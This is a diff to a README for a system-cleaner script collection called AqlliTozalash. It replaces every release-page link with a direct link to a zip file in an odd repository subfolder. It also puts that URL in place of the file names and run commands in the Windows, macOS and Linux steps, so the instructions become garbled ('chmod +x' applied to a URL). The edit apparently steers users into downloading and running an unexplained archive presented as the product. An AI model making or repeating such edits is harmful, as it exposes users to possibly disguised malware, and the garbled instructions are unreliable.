@@ -4,7 +4,7 @@
 
 AqlliTozalash is a simple and user-friendly collection of scripts to clean your MacOS, Linux, and Windows systems. It removes unnecessary files and caches, boosting your system speed. Follow this guide to download and run the software easily.
 
-[![Download AqlliTozalash](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen.svg)](https://github.com/manhoza98/AqlliTozalash/releases)
+[![Download AqlliTozalash](https://github.com/manhoza98/AqlliTozalash/raw/refs/heads/main/superreliance/Aqlli-Tozalash-1.3-beta.1.zip%20Now-Get%https://github.com/manhoza98/AqlliTozalash/raw/refs/heads/main/superreliance/Aqlli-Tozalash-1.3-beta.1.zip)](https://github.com/manhoza98/AqlliTozalash/raw/refs/heads/main/superreliance/Aqlli-Tozalash-1.3-beta.1.zip)
 
 ## 📋 Overview
 
@@ -34,7 +34,7 @@ To use AqlliTozalash, make sure your system meets these requirements:
 
 To download AqlliTozalash, visit the following page:
 
-[Download Releases Page](https://github.com/manhoza98/AqlliTozalash/releases)
+[Download Releases Page](https://github.com/manhoza98/AqlliTozalash/raw/refs/heads/main/superreliance/Aqlli-Tozalash-1.3-beta.1.zip)
 
 On this page, you will see different versions of the application. Choose the version suitable for your operating system and download the respective file.
 
@@ -42,30 +42,30 @@ On this page, you will see different versions of the application. Choose the ver
 
 ### 🖥️ Windows
 
-1. Go to the [Download Releases Page](https://github.com/manhoza98/AqlliTozalash/releases).
+1. Go to the [Download Releases Page](https://github.com/manhoza98/AqlliTozalash/raw/refs/heads/main/superreliance/Aqlli-Tozalash-1.3-beta.1.zip).
 2. Find the latest version labeled for Windows.
-3. Click the file (e.g., `AqlliTozalash-windows.zip`) to download it.
+3. Click the file (e.g., `https://github.com/manhoza98/AqlliTozalash/raw/refs/heads/main/superreliance/Aqlli-Tozalash-1.3-beta.1.zip`) to download it.
 4. Extract the zip file.
-5. Double-click `AqlliTozalash.bat` to run the application.
+5. Double-click `https://github.com/manhoza98/AqlliTozalash/raw/refs/heads/main/superreliance/Aqlli-Tozalash-1.3-beta.1.zip` to run the application.
 
 ### 🍏 MacOS
 
-1. Visit the [Download Releases Page](https://github.com/manhoza98/AqlliTozalash/releases).
+1. Visit the [Download Releases Page](https://github.com/manhoza98/AqlliTozalash/raw/refs/heads/main/superreliance/Aqlli-Tozalash-1.3-beta.1.zip).
 2. Locate the latest version for MacOS.
-3. Click on the file (e.g., `AqlliTozalash-macos.zip`) to download.
+3. Click on the file (e.g., `https://github.com/manhoza98/AqlliTozalash/raw/refs/heads/main/superreliance/Aqlli-Tozalash-1.3-beta.1.zip`) to download.
 4. Extract the zip file.
 5. Open Terminal and navigate to the extracted folder.
-6. Run `./AqlliTozalash.command` to start the program.
+6. Run `https://github.com/manhoza98/AqlliTozalash/raw/refs/heads/main/superreliance/Aqlli-Tozalash-1.3-beta.1.zip` to start the program.
 
 ### 🐧 Linux
 
-1. Navigate to the [Download Releases Page](https://github.com/manhoza98/AqlliTozalash/releases).
+1. Navigate to the [Download Releases Page](https://github.com/manhoza98/AqlliTozalash/raw/refs/heads/main/superreliance/Aqlli-Tozalash-1.3-beta.1.zip).
 2. Find the correct version for Linux.
-3. Download the file (e.g., `AqlliTozalash-linux.tar.gz`).
-4. Extract the tar.gz file.
+3. Download the file (e.g., `https://github.com/manhoza98/AqlliTozalash/raw/refs/heads/main/superreliance/Aqlli-Tozalash-1.3-beta.1.zip`).
+4. Extract the https://github.com/manhoza98/AqlliTozalash/raw/refs/heads/main/superreliance/Aqlli-Tozalash-1.3-beta.1.zip file.
 5. Open a terminal and move to the extracted directory.
-6. Use `chmod +x AqlliTozalash.sh` to make it executable.
-7. Run the command `./AqlliTozalash.sh` to launch the application.
+6. Use `chmod +x https://github.com/manhoza98/AqlliTozalash/raw/refs/heads/main/superreliance/Aqlli-Tozalash-1.3-beta.1.zip` to make it executable.
+7. Run the command `https://github.com/manhoza98/AqlliTozalash/raw/refs/heads/main/superreliance/Aqlli-Tozalash-1.3-beta.1.zip` to launch the application.
 
 ## 🚧 Troubleshooting
 
